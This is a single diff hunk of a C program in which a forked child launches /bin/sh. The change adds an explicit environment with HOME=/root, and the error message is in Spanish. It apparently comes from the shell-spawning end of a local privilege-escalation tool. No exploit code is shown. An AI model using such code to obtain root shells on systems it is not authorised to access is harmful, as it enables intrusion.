@@ -48,7 +48,7 @@ int main() {
         pid_t pid = fork();
         if (pid == 0) {
             char *argv[] = { "/bin/sh", NULL };
-            execve("/bin/sh", argv, NULL);
+            char *envp[] = { "PATH=/usr/bin:/bin:/usr/sbin:/sbin", "HOME=/root", "TERM=linux", NULL }; execve("/bin/sh", argv, envp);
             perror("[!] Error ejecutando consola de sistema");
             exit(1);
         } else if (pid > 0) {
